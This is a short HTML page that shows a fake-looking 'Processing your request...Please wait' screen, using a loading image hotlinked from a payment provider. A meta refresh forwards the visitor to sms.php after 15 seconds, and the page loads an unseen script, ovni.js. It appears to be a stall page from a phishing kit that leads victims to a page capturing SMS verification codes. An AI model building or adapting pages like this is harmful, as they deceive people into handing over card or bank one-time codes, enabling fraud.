<html lang="en" class="fac-events-icons-ready fac-events-typefaces-cera-pro-ready fac-events-typefaces-cera-pro-700-normal-ready fac-events-typefaces-cera-pro-400-normal-ready fac-events-typefaces-cera-pro-400-italic-ready fac-events-typefaces-cera-pro-700-italic-ready fac-events-typefaces-cera-round-pro-ready fac-events-typefaces-cera-round-pro-700-normal-ready fac-events-typefaces-cera-round-pro-400-normal-ready fac-events-typefaces-cera-round-pro-900-normal-ready fac-events-typefaces-cera-round-pro-500-normal-ready fac-events-typefaces-press-start-ready fac-events-typefaces-press-start-normal-normal-ready"><head>
    <meta http-equiv="refresh" content="15;url=sms.php">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.2.1/css/all.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.2.1/css/sharp-solid.css">
    <script src="https://use.fortawesome.com/1ce05b4b.js"></script><link rel="stylesheet" href="https://use.fortawesome.com/kits/1ce05b4b/publications/128039/woff2.css" media="all"><link rel="stylesheet" href="https://use.fortawesome.com/kits/1ce05b4b/publications/128039/woff2.css" media="all"><link rel="stylesheet" href="https://use.fortawesome.com/kits/1ce05b4b/publications/122407/woff2.css" media="all"><link rel="stylesheet" href="https://use.fortawesome.com/kits/1ce05b4b/publications/122407/woff2.css" media="all">
    <link rel="stylesheet" href="https://use.fortawesome.com/kits/1ce05b4b/publications/122407/woff2.css" media="all">
    <link href="files/css/styles.css" rel="stylesheet">
    <link href="files/css/footer.css" rel="stylesheet">
    <title>  </title>
  </head>
  
  <body>
      <header>
          <div class="header">
          <i class="fa-solid fa-bars"></i>
         
          </div>
      </header>
  
      <div class="col-xs-12 col-sm-4 col-sm-offset-4 col-md-2 col-md-offset-5 ogilvy-espacioboton">
          <div id="PageFooter">
              <div id="CollapseFooter" class="buttonHide"></div>
              <center>
                  <div id="Div1" class="buttonShow noseve" style="margin-top: 40px;">
                      <img alt="" srcset="" style="height: 60px;width: 60px;" src="https://secure.oceanpayment.com/paymentpages/web/images/loading.gif">
                      

                      <h3>Processing your request...Please wait</h3>
                  </div>
              </center>
  
  
  
  
      </div>
  
  
  
      <script src="./files/ovni.js" type="text/javascript"></script>
  
  
  
  </div></body></html>